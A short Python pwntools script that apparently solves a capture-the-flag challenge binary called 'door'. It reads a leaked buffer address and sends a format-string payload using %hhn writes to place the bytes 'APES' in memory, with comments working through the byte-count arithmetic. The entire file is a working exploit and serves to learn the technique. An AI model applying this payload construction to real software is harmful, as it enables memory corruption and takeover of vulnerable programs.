#!/usr/bin/env python2

from pwn import*

p = process('./door')

p.recvuntil('blocked the way at ', drop=True)

buffAddr = int(p.recvline(), 16)
Addr0 = p32(buffAddr)
Addr1 = p32(buffAddr + 1)
Addr2 = p32(buffAddr + 2)
Addr3 = p32(buffAddr + 3)

p.recvuntil('I shall open: ', drop=True) 

#%2$n - write the number of characters output so far
# to the second argument 

# offset is the initial number of characters written to buffAddr
# i.e. 4*4 for the four addresses + 1 for the space 
offset = 17
payload = " {}{}{}{}".format(Addr0, Addr1, Addr2, Addr3)
payload += "%{}x%2$hhn".format(ord('A')-offset)
payload += "%{}x%3$hhn".format(ord('P')-ord('A'))

# have written 0x50 ('P') bytes so far
# need to write 0x145 bytes ('E' is 0x45) 
# = (0x100 + 0x45 - (0x50 bytes that have already been written))
payload += "%{}x%4$hhn".format(0x100 + (ord('E') - ord('P')))
payload += "%{}x%5hhn".format(ord('S') - ord('E'))

p.sendline(payload)

p.interactive()
